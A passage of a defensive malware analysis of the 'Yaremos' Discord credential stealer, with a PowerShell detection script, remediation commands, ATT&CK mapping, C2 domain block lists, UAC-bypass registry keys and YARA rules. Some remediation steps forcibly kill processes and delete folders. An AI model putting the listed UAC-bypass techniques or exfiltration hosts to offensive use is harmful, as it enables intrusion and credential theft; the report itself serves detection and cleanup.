Write-Host "â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•" -ForegroundColor Red
Write-Host ""

$findings = @{
    DiscordInjection = @()
    ScheduledTasks = @()
    RegistryKeys = @()
    FileMasquerading = @()
    UACBypass = @()
    SuspiciousProcesses = @()
    NetworkConnections = @()
}

# 1. Check Discord Injection
Write-Host "[1/7] Checking for Discord core.asar injection..." -ForegroundColor Cyan
$discordPaths = @(
    "$env:LOCALAPPDATA\Discord",
    "$env:LOCALAPPDATA\DiscordCanary",
    "$env:LOCALAPPDATA\DiscordPTB"
)

foreach ($path in $discordPaths) {
    if (Test-Path $path) {
        Get-ChildItem -Path $path -Recurse -Filter "core.asar" -ErrorAction SilentlyContinue | 
            ForEach-Object {
                $age = (Get-Date) - $_.LastWriteTime
                if ($age.TotalDays -lt 30) {
                    $findings.DiscordInjection += [PSCustomObject]@{
                        Path = $_.FullName
                        Modified = $_.LastWriteTime
                        Size = $_.Length
                        DaysSinceModification = [math]::Round($age.TotalDays, 1)
                    }
                    Write-Host "    [!] SUSPICIOUS: $($_.FullName)" -ForegroundColor Red
                    Write-Host "        Modified: $($_.LastWriteTime) ($([math]::Round($age.TotalDays, 1)) days ago)" -ForegroundColor Red
                }
            }
    }
}

# 2. Check Scheduled Tasks
Write-Host "[2/7] Checking for malicious scheduled tasks..." -ForegroundColor Cyan
$tasks = Get-ScheduledTask | Where-Object {
    $_.Settings.Hidden -eq $true -or 
    $_.Description -like "*autochk*" -or
    $_.Description -like "*telemetry*" -or
    $_.Description -like "*sync*"
}

foreach ($task in $tasks) {
    $findings.ScheduledTasks += $task
    Write-Host "    [!] FOUND: $($task.TaskName)" -ForegroundColor Red
}

# 3. Check Registry
Write-Host "[3/7] Checking registry run keys..." -ForegroundColor Cyan
$runKeys = @(
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce"
)

foreach ($key in $runKeys) {
    if (Test-Path $key) {
        $values = Get-ItemProperty $key -ErrorAction SilentlyContinue
        $values.PSObject.Properties | Where-Object {
            $_.Name -notmatch "PS" -and $_.Value -ne $null
        } | ForEach-Object {
            $findings.RegistryKeys += [PSCustomObject]@{
                Key = $key
                Name = $_.Name
                Value = $_.Value
            }
            Write-Host "    [!] FOUND: $($_.Name)" -ForegroundColor Yellow
        }
    }
}

# 4. Check File Masquerading
Write-Host "[4/7] Checking for file masquerading..." -ForegroundColor Cyan
$systemCache = "$env:LOCALAPPDATA\Microsoft\Windows\SystemCache"
if (Test-Path $systemCache) {
    Write-Host "    [!] ALERT: SystemCache folder exists!" -ForegroundColor Red
    Get-ChildItem $systemCache -Force -ErrorAction SilentlyContinue | ForEach-Object {
        $findings.FileMasquerading += $_
        Write-Host "        $($_.Name)" -ForegroundColor Red
    }
}

# 5. Check UAC Bypass
Write-Host "[5/7] Checking for UAC bypass artifacts..." -ForegroundColor Cyan
$uacKeys = @(
    "HKCU:\Software\Classes\ms-settings\shell\open\command",
    "HKCU:\Software\Classes\mscfile\shell\open\command",
    "HKCU:\Software\Classes\Folder\shell\open\command",
    "HKCU:\Software\Classes\exefile\shell\runas\command"
)

foreach ($key in $uacKeys) {
    if (Test-Path $key) {
        $findings.UACBypass += $key
        Write-Host "    [!] UAC BYPASS KEY: $key" -ForegroundColor Red
    }
}

# 6. Check Processes
Write-Host "[6/7] Checking for suspicious processes..." -ForegroundColor Cyan
$processes = Get-Process | Where-Object {
    ($_.ProcessName -like "*node*" -or $_.ProcessName -like "*python*") -and
    ($_.Path -like "*AppData*" -or $_.Path -like "*Temp*" -or $_.Path -like "*SystemCache*")
}

foreach ($proc in $processes) {
    $findings.SuspiciousProcesses += $proc
    Write-Host "    [!] SUSPICIOUS: $($proc.ProcessName) (PID: $($proc.Id))" -ForegroundColor Red
    Write-Host "        Path: $($proc.Path)" -ForegroundColor Red
}

# 7. Check Network
Write-Host "[7/7] Checking network connections..." -ForegroundColor Cyan
$c2Domains = @("network-sync-protocol.net", "datanetworksync.onrender.com", "gofile.io")
$netstat = netstat -ano | Out-String

foreach ($domain in $c2Domains) {
    if ($netstat -match $domain) {
        $findings.NetworkConnections += $domain
        Write-Host "    [!] C2 CONNECTION: $domain" -ForegroundColor Red
    }
}

# Summary
Write-Host "`nâ•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—" -ForegroundColor Cyan
Write-Host "â•‘                    DETECTION SUMMARY                         â•‘" -ForegroundColor Cyan
Write-Host "â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•" -ForegroundColor Cyan
Write-Host ""

$threatLevel = "CLEAN"
$totalFindings = 0

$totalFindings += $findings.DiscordInjection.Count
$totalFindings += $findings.ScheduledTasks.Count
$totalFindings += $findings.RegistryKeys.Count
$totalFindings += $findings.FileMasquerading.Count
$totalFindings += $findings.UACBypass.Count
$totalFindings += $findings.SuspiciousProcesses.Count
$totalFindings += $findings.NetworkConnections.Count

if ($totalFindings -gt 0) {
    $threatLevel = if ($findings.DiscordInjection.Count -gt 0 -or $findings.NetworkConnections.Count -gt 0) {
        "CRITICAL"
    } elseif ($findings.ScheduledTasks.Count -gt 0 -or $findings.FileMasquerading.Count -gt 0) {
        "HIGH"
    } else {
        "MEDIUM"
    }
}

Write-Host "Threat Level: " -NoNewline
switch ($threatLevel) {
    "CRITICAL" { Write-Host "ğŸ”´ CRITICAL - ACTIVE INFECTION DETECTED" -ForegroundColor Red }
    "HIGH" { Write-Host "ğŸŸ  HIGH - INFECTION LIKELY" -ForegroundColor Red }
    "MEDIUM" { Write-Host "ğŸŸ¡ MEDIUM - SUSPICIOUS ACTIVITY" -ForegroundColor Yellow }
    "CLEAN" { Write-Host "ğŸŸ¢ CLEAN - NO THREATS DETECTED" -ForegroundColor Green }
}

Write-Host ""
Write-Host "Findings:" -ForegroundColor Cyan
Write-Host "  Discord Injection:     $($findings.DiscordInjection.Count)" -ForegroundColor $(if ($findings.DiscordInjection.Count -gt 0) { "Red" } else { "Green" })
Write-Host "  Scheduled Tasks:       $($findings.ScheduledTasks.Count)" -ForegroundColor $(if ($findings.ScheduledTasks.Count -gt 0) { "Red" } else { "Green" })
Write-Host "  Registry Keys:         $($findings.RegistryKeys.Count)" -ForegroundColor $(if ($findings.RegistryKeys.Count -gt 0) { "Yellow" } else { "Green" })
Write-Host "  File Masquerading:     $($findings.FileMasquerading.Count)" -ForegroundColor $(if ($findings.FileMasquerading.Count -gt 0) { "Red" } else { "Green" })
Write-Host "  UAC Bypass:            $($findings.UACBypass.Count)" -ForegroundColor $(if ($findings.UACBypass.Count -gt 0) { "Red" } else { "Green" })
Write-Host "  Suspicious Processes:  $($findings.SuspiciousProcesses.Count)" -ForegroundColor $(if ($findings.SuspiciousProcesses.Count -gt 0) { "Red" } else { "Green" })
Write-Host "  C2 Connections:        $($findings.NetworkConnections.Count)" -ForegroundColor $(if ($findings.NetworkConnections.Count -gt 0) { "Red" } else { "Green" })
Write-Host ""

if ($threatLevel -ne "CLEAN") {
    Write-Host "â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—" -ForegroundColor Red
    Write-Host "â•‘                  âš ï¸  IMMEDIATE ACTIONS âš ï¸                    â•‘" -ForegroundColor Red
    Write-Host "â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•" -ForegroundColor Red
    Write-Host ""
    Write-Host "1. DISCONNECT FROM INTERNET IMMEDIATELY" -ForegroundColor Red
    Write-Host "2. Run the remediation script" -ForegroundColor Red
    Write-Host "3. Change ALL passwords from a clean device" -ForegroundColor Red
    Write-Host "4. Revoke Discord/Roblox/Steam sessions" -ForegroundColor Red
    Write-Host "5. Monitor financial accounts" -ForegroundColor Red
    Write-Host ""
}

# Export report
$reportPath = "$env:USERPROFILE\Desktop\YaremosMalwareDetection_$(Get-Date -Format 'yyyyMMdd_HHmmss').json"
$findings | ConvertTo-Json -Depth 10 | Out-File $reportPath
Write-Host "[+] Report saved to: $reportPath" -ForegroundColor Green
```

---

## ğŸ› ï¸ Complete Remediation Guide

### âš ï¸ CRITICAL: Read Before Starting

**IMPORTANT:** This malware has likely already stolen:
- All browser passwords
- Discord tokens
- Gaming account credentials  
- Credit card information
- Session cookies

**YOU MUST:**
1. Disconnect from internet BEFORE remediation
2. Change ALL passwords from a CLEAN device after remediation
3. Revoke all sessions on Discord, Roblox, Steam
4. Monitor financial accounts for 30 days

### Manual Remediation Steps

#### Step 1: Disconnect from Internet âš ï¸ CRITICAL
```powershell
# Disable all network adapters
Get-NetAdapter | Disable-NetAdapter -Confirm:$false
```

#### Step 2: Kill Malicious Processes
```powershell
# Kill Node.js processes
Get-Process -Name "node" -ErrorAction SilentlyContinue | Stop-Process -Force

# Kill Python processes from suspicious locations
Get-Process -Name "python*" -ErrorAction SilentlyContinue | 
    Where-Object {$_.Path -like "*AppData*"} | 
    Stop-Process -Force

# Kill PowerShell processes (if not current)
Get-Process -Name "powershell" -ErrorAction SilentlyContinue | 
    Where-Object {$_.Id -ne $PID} | 
    Stop-Process -Force
```

#### Step 3: Remove Discord Injection âš ï¸ CRITICAL
```powershell
# Uninstall Discord completely
Write-Host "[*] Removing Discord..." -ForegroundColor Yellow

# Kill Discord processes
Get-Process | Where-Object {$_.ProcessName -like "*Discord*"} | Stop-Process -Force

# Remove Discord installations
$discordPaths = @(
    "$env:LOCALAPPDATA\Discord",
    "$env:LOCALAPPDATA\DiscordCanary",
    "$env:LOCALAPPDATA\DiscordPTB"
)

foreach ($path in $discordPaths) {
    if (Test-Path $path) {
        Write-Host "    Removing: $path" -ForegroundColor Yellow
        Remove-Item -Path $path -Recurse -Force -ErrorAction SilentlyContinue
    }
}

# Remove Discord from AppData Roaming
$roamingDiscord = "$env:APPDATA\discord"
if (Test-Path $roamingDiscord) {
    Remove-Item -Path $roamingDiscord -Recurse -Force -ErrorAction SilentlyContinue
}

Write-Host "[+] Discord removed. Reinstall from official site after remediation." -ForegroundColor Green
```

#### Step 4: Remove Scheduled Tasks
```powershell
# List and remove suspicious tasks
Get-ScheduledTask | Where-Object {
    $_.Settings.Hidden -eq $true -or 
    $_.Description -like "*autochk*" -or
    $_.Description -like "*telemetry*"
} | ForEach-Object {
    Write-Host "[*] Removing task: $($_.TaskName)" -ForegroundColor Yellow
    Unregister-ScheduledTask -TaskName $_.TaskName -Confirm:$false
    Write-Host "[+] Removed: $($_.TaskName)" -ForegroundColor Green
}
```

#### Step 5: Remove Registry Keys
```powershell
# Remove Run keys (CAREFUL - only remove suspicious entries)
$runKeys = @(
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce"
)

foreach ($key in $runKeys) {
    if (Test-Path $key) {
        $values = Get-ItemProperty $key -ErrorAction SilentlyContinue
        $values.PSObject.Properties | Where-Object {
            $_.Name -notmatch "PS" -and $_.Value -ne $null
        } | ForEach-Object {
            Write-Host "[?] Found: $($_.Name) = $($_.Value)" -ForegroundColor Yellow
            $remove = Read-Host "    Remove this entry? (yes/no)"
            if ($remove -eq "yes") {
                Remove-ItemProperty -Path $key -Name $_.Name -Force
                Write-Host "[+] Removed: $($_.Name)" -ForegroundColor Green
            }
        }
    }
}

# Remove UAC bypass keys
$uacKeys = @(
    "HKCU:\Software\Classes\ms-settings",
    "HKCU:\Software\Classes\mscfile",
    "HKCU:\Software\Classes\Folder\shell\open\command",
    "HKCU:\Software\Classes\exefile\shell\runas"
)

foreach ($key in $uacKeys) {
    if (Test-Path $key) {
        Write-Host "[*] Removing UAC bypass key: $key" -ForegroundColor Yellow
        Remove-Item -Path $key -Recurse -Force -ErrorAction SilentlyContinue
        Write-Host "[+] Removed: $key" -ForegroundColor Green
    }
}

# Restore windir environment variable if modified
try {
    $currentWinDir = [Environment]::GetEnvironmentVariable("windir", "User")
    if ($currentWinDir -and $currentWinDir -ne "C:\Windows") {
        Write-Host "[!] Restoring windir variable..." -ForegroundColor Yellow
        [Environment]::SetEnvironmentVariable("windir", "C:\Windows", "User")
        reg delete "HKCU\Environment" /v windir /f 2>$null
        Write-Host "[+] windir restored" -ForegroundColor Green
    }
} catch {}
```

#### Step 6: Remove File Masquerading
```powershell
# Remove SystemCache folder
$systemCache = "$env:LOCALAPPDATA\Microsoft\Windows\SystemCache"
if (Test-Path $systemCache) {
    Write-Host "[*] Removing SystemCache folder..." -ForegroundColor Yellow
    
    # List files first
    Get-ChildItem $systemCache -Force | ForEach-Object {
        Write-Host "    File: $($_.Name)" -ForegroundColor Red
    }
    
    # Remove
    Remove-Item -Path $systemCache -Recurse -Force -ErrorAction SilentlyContinue
    Write-Host "[+] SystemCache folder removed" -ForegroundColor Green
} else {
    Write-Host "[+] No SystemCache folder found" -ForegroundColor Green
}
```

#### Step 7: Clear Startup Folder
```powershell
# Clear startup folder
$startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
$files = Get-ChildItem $startupPath -File -ErrorAction SilentlyContinue

foreach ($file in $files) {
    Write-Host "[?] Found in startup: $($file.Name)" -ForegroundColor Yellow
    $remove = Read-Host "    Remove this file? (yes/no)"
    if ($remove -eq "yes") {
        Remove-Item $file.FullName -Force
        Write-Host "[+] Removed: $($file.Name)" -ForegroundColor Green
    }
}
```

#### Step 8: Block C2 Domains
```powershell
# Add C2 domains to hosts file
$hostsPath = "C:\Windows\System32\drivers\etc\hosts"
$c2Domains = @(
    "network-sync-protocol.net",
    "datanetworksync.onrender.com",
    "sync-service.system-telemetry.workers.dev",
    "funnywebsiteviewer.onrender.com",
    "store1.gofile.io",
    "store2.gofile.io",
    "store3.gofile.io",
    "store4.gofile.io",
    "store5.gofile.io",
    "store8.gofile.io"
)

# Backup hosts file
Copy-Item $hostsPath "$hostsPath.backup.$(Get-Date -Format 'yyyyMMdd')"

# Add blocks
Add-Content -Path $hostsPath -Value ""
Add-Content -Path $hostsPath -Value "# Yaremos Malware C2 Blocks - Added $(Get-Date)"

foreach ($domain in $c2Domains) {
    Add-Content -Path $hostsPath -Value "127.0.0.1 $domain"
    Write-Host "[+] Blocked: $domain" -ForegroundColor Green
}
```

#### Step 9: Clear Browser Data (MANUAL)
```
You MUST manually clear browser data for ALL browsers:

Chrome:
- Settings â†’ Privacy and security â†’ Clear browsing data
- Select: Cookies, Passwords, Cached images, Autofill

Firefox:
- Settings â†’ Privacy & Security â†’ Cookies and Site Data â†’ Clear Data
- Settings â†’ Privacy & Security â†’ Logins and Passwords â†’ Saved Logins â†’ Remove All

Edge:
- Settings â†’ Privacy, search, and services â†’ Clear browsing data
- Select: Cookies, Passwords, Cached data, Autofill

Brave:
- Settings â†’ Shields â†’ Clear browsing data
- Select: All data types

DO THIS FOR ALL 16+ BROWSERS LISTED IN THE ANALYSIS
```

#### Step 10: Full System Scan
```powershell
# Update Windows Defender
Write-Host "[*] Updating Windows Defender..." -ForegroundColor Cyan
Update-MpSignature

# Full scan
Write-Host "[*] Starting full system scan..." -ForegroundColor Cyan
Start-MpScan -ScanType FullScan

# Also run:
# - Malwarebytes
# - HitmanPro
# - ESET Online Scanner
```

### Post-Remediation Steps âš ï¸ CRITICAL

#### 1. Change ALL Passwords (From Clean Device)
```
Change passwords in this order:
1. Email accounts (primary and recovery)
2. Discord
3. Roblox
4. Steam
5. TikTok
6. Minecraft/Mojang
7. Banking/PayPal/Stripe
8. Epic Games, Riot, Ubisoft, EA, Rockstar
9. Social media (Facebook, Twitter, Instagram, Snapchat)
10. Cloud storage (Google Drive, OneDrive, iCloud)
11. GitHub, GitLab
12. Streaming (Netflix, Amazon Prime, Disney+)
13. ALL other accounts
```

#### 2. Revoke All Sessions
```
Discord:
- User Settings â†’ Devices â†’ Log out all devices
- Enable 2FA if not already enabled

Roblox:
- Settings â†’ Security â†’ Sign out of all other sessions
- Enable 2-Step Verification

Steam:
- Account Details â†’ Manage Steam Guard Account Security
- Deauthorize all other devices
- Enable Steam Guard Mobile Authenticator

TikTok:
- Settings â†’ Security â†’ Devices â†’ Remove all devices

GitHub:
- Settings â†’ Sessions â†’ Revoke all

Google:
- Account â†’ Security â†’ Your devices â†’ Sign out of all sessions
```

#### 3. Enable 2FA Everywhere
Use an authenticator app (NOT SMS if possible):
- Google Authenticator
- Microsoft Authenticator
- Authy
- 1Password

#### 4. Monitor Financial Accounts
```
- Check all credit cards for unauthorized charges
- Review bank statements
- Set up fraud alerts
- Consider credit freeze
- Monitor for next 30 days minimum
```

#### 5. Contact Platform Support
```
If you had active sessions or unauthorized activity:
- Discord Trust & Safety: https://dis.gd/report
- Roblox Support: https://www.roblox.com/support
- Steam Support: https://help.steampowered.com
- Contact your bank/credit card company
```

#### 6. Reinstall Discord (Clean)
```powershell
# Download latest Discord from official site only
Start-Process "https://discord.com/download"

# After install, change password and enable 2FA BEFORE logging in
```

#### 7. Consider Full System Reinstall
```
If critical data was stolen or you're unsure about complete removal:
1. Backup important files (scan them first!)
2. Create Windows installation media
3. Perform clean Windows installation
4. Reinstall applications from official sources only
5. Restore files (after scanning)
```

---

## ğŸ“‹ MITRE ATT&CK Mapping

| Tactic | Technique | ID | Implementation |
|--------|-----------|-----|----------------|
| **Initial Access** | Phishing | T1566.001 | Discord DM with malicious link |
| **Execution** | User Execution | T1204.002 | Victim runs game installer |
| **Execution** | Command and Scripting Interpreter | T1059.001 | PowerShell, Python, JavaScript |
| **Persistence** | Registry Run Keys | T1547.001 | HKCU\...\Run |
| **Persistence** | Scheduled Task/Job | T1053.005 | Hidden tasks with multiple triggers |
| **Persistence** | Modify System Image | T1601 | Discord core.asar injection |
| **Privilege Escalation** | Bypass User Account Control | T1548.002 | 7 UAC bypass techniques |
| **Privilege Escalation** | Access Token Manipulation | T1134.001 | LSASS impersonation |
| **Defense Evasion** | Obfuscated Files or Information | T1027 | Heavy JavaScript obfuscation |
| **Defense Evasion** | Masquerading | T1036.004 | Files disguised as Windows processes |
| **Defense Evasion** | Hide Artifacts | T1564.001 | Hidden files (+H +S attributes) |
| **Credential Access** | Credentials from Password Stores | T1555.003 | Browser credential theft |
| **Credential Access** | Credentials from Web Browsers | T1555.003 | 16+ browsers targeted |
| **Discovery** | System Information Discovery | T1082 | HWID, OS version, IP |
| **Discovery** | Process Discovery | T1057 | Process enumeration |
| **Collection** | Data from Local System | T1005 | Browser data, credentials |
| **Collection** | Input Capture | T1056.001 | Discord message monitoring |
| **Command and Control** | Web Service | T1102 | GoFile, Render, Workers.dev |
| **Exfiltration** | Exfiltration Over Web Service | T1567.002 | GoFile uploads |
| **Impact** | Data Encrypted for Impact | T1486 | Potential (encrypted exfil) |

---

## ğŸ”¬ Forensic Indicators

### File System Artifacts

#### Malware Files
```
%install_location%\scripts\crypted.js
%install_location%\scripts\discord-injection-obf.js
%install_location%\scripts\Ran_by_resolve.py
%LOCALAPPDATA%\Microsoft\Windows\SystemCache\*.exe
%TEMP%\~*.vbs (temporary VBScript files)
```

#### Modified Files
```
%LOCALAPPDATA%\Discord\app-*\modules\discord_desktop_core-*\discord_desktop_core\core.asar
(Check LastWriteTime - should not be recent)
```

#### Log Files (Check for evidence)
```
%TEMP%\<IDENTIFIER>\passwords\*
%TEMP%\decrypted_keys\*
%TEMP%\*.zip (exfiltration packages)
```

### Registry Artifacts

#### Run Keys
```
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
```

#### UAC Bypass Keys
```
HKCU\Software\Classes\ms-settings\shell\open\command
HKCU\Software\Classes\mscfile\shell\open\command
HKCU\Software\Classes\Folder\shell\open\command
HKCU\Software\Classes\exefile\shell\runas\command
HKCU\Environment (check windir value)
```

### Network Artifacts

#### DNS Queries
```
network-sync-protocol.net
datanetworksync.onrender.com
sync-service.system-telemetry.workers.dev
funnywebsiteviewer.onrender.com
store[1-8].gofile.io
ip-api.com
api.ipify.org
```

#### HTTP/HTTPS Connections
```
POST /api/send (to C2 servers)
POST /uploadFile (to GoFile)
GET /json (to IP geolocation services)
```

### Process Artifacts

#### Suspicious Process Names
```
node.exe (from AppData or Temp)
python.exe (from AppData or Temp)
powershell.exe (child of malware)
cmd.exe (for registry modifications)
wscript.exe (VBScript elevation)
```

#### Suspicious Parent-Child Relationships
```
game.exe â†’ node.exe
node.exe â†’ python.exe
node.exe â†’ powershell.exe
wscript.exe â†’ malware.exe (elevated)
```

### Event Log Indicators

#### Security Log (Event ID 4688 - Process Creation)
```
Look for:
- node.exe with command line containing AppData
- python.exe with suspicious parameters
- reg.exe with UAC bypass registry keys
- schtasks.exe creating hidden tasks
```

#### Task Scheduler Log
```
Look for:
- Task creation events for hidden tasks
- Tasks with suspicious descriptions
- Tasks running from AppData or Temp
```

---

## ğŸ“Š Threat Intelligence Summary

### Campaign Information
- **Campaign Name:** Yaremos
- **First Observed:** Unknown (ongoing as of Feb 2026)
- **Distribution:** Discord social engineering
- **Target:** Gaming community (Discord, Roblox, Steam users)

### TTPs Summary
- Multi-stage JavaScript + Python malware
- Discord client hijacking for propagation
- Advanced credential decryption (DPAPI, CNG, LSASS)
- Multiple UAC bypass techniques
- Worm-like propagation via compromised accounts

### Hardcoded Secrets (Can be used for detection)
```
AES Key: B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787
ChaCha20 Key: E98F37D7F4E1FA433D19304DC2258042090E2D1D7EEA7670D41F738D08729660
XOR Key: CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390
Steam API Key: 440D7F4D810EF9298D25EDDF37C1F902
```

### Yara Rules

```yara
rule Yaremos_Malware {
    meta:
        description = "Detects Yaremos Discord game malware"
        author = "Security Researcher"
        date = "2026-02-20"
        threat_level = "critical"
        
    strings:
        $c2_1 = "network-sync-protocol.net" ascii wide
        $c2_2 = "datanetworksync.onrender.com" ascii wide
        $c2_3 = "sync-service.system-telemetry.workers.dev" ascii wide
        
        $key1 = "B31C6E241AC846728DA9C1FAC4936651" ascii wide
        $key2 = "E98F37D7F4E1FA433D19304DC2258042" ascii wide
        
        $func1 = "__p_2431223822__JS_CRITICAL__" ascii wide
        $func2 = "Return_Char" ascii wide
        
        $persist1 = "core.asar" ascii wide
        $persist2 = "SystemCacheService.exe" ascii wide
        $persist3 = "autochk SQM data" ascii wide
        
    condition:
        any of ($c2_*) or 
        any of ($key*) or
        (2 of ($func*) and 1 of ($persist*))
}

rule Yaremos_Python_Component {
    meta:
        description = "Detects Python credential stealer component"
        author = "Security Researcher"
        
    strings:
        $import1 = "import windows.crypto" ascii
        $import2 = "import windows.security" ascii
        $func1 = "impersonate_lsass" ascii
        $func2 = "decrypt_with_cng" ascii
        $func3 = "derive_v20_master_key" ascii
        
    condition:
        all of them
}
```

---

## ğŸš¨ Immediate Actions Checklist

### If You Suspect Infection

- [ ] **DISCONNECT FROM INTERNET** (disable network adapter)
- [ ] Run detection script
- [ ] Document all findings
- [ ] Run remediation steps
- [ ] **Change ALL passwords from clean device**
- [ ] Revoke all sessions (Discord, Roblox, Steam, etc.)
- [ ] Enable 2FA on all accounts
- [ ] Monitor financial accounts for 30 days
- [ ] Contact platform support if needed
- [ ] Consider full system reinstall if critical data stolen
- [ ] Report to Discord Trust & Safety
- [ ] Warn your Discord contacts

### If You Received Suspicious DM

- [ ] **DO NOT click the link**
- [ ] **DO NOT download anything**
- [ ] Report the message to Discord
- [ ] Warn the sender (their account is compromised)
- [ ] Delete the message
- [ ] Enable 2FA if not already enabled

---

## ğŸ“ Resources & Contacts

### Platform Support
- **Discord Trust & Safety:** https://dis.gd/report
- **Roblox Support:** https://www.roblox.com/support
- **Steam Support:** https://help.steampowered.com
- **Epic Games:** https://www.epicgames.com/help

### Security Resources
- **Reddit Thread:** https://www.reddit.com/r/antivirus/comments/1r9kk7l/beta_game_malware_yaremos/
- **Discord core.asar Info:** https://gist.github.com/vanyle/edbdd0c28a0150af3b905b99a4c48f00
- **Microsoft Security Response Center:** https://msrc.microsoft.com

### Law Enforcement (If Identity Theft Occurs)
- File police report
- Contact FBI IC3: https://www.ic3.gov
- Contact FTC: https://www.identitytheft.gov

---

## ğŸ“ Document Version

**Version:** 1.0  
**Last Updated:** February 20, 2026  
**Analysis Completeness:** COMPREHENSIVE (All 3 components analyzed)

**Components Analyzed:**
- âœ… crypted.js (resolved.js) - 51,714 lines
- âœ… discord-injection-obf.js (output.js) - 5,937 lines  
- âœ… Ran_by_resolve.py - 1,205 lines

---

**âš ï¸ WARNING: This malware is ACTIVELY spreading via Discord. Share this analysis with your contacts to prevent further infections.**

---

**END OF COMPREHENSIVE MALWARE ANALYSIS**
